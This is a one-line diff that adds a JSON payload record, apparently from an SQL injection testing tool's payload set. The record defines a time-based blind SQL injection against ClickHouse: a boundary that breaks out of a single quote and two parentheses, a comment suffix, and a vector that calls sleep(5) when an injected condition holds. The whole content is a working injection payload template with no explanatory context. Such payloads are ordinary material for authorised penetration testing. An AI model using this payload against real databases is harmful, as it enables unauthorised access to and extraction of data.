@@ -1,0 +1,1 @@
+{"dbms": "clickhouse", "technique": "time", "boundary": {"prefix": "'))", "suffix": "-- -", "type": "paren2-single"}, "vector": "{B} AND CASE WHEN ({T}) THEN sleep(5) ELSE sleep(0) END", "comment": "clickhouse time: single in 2 parens"}
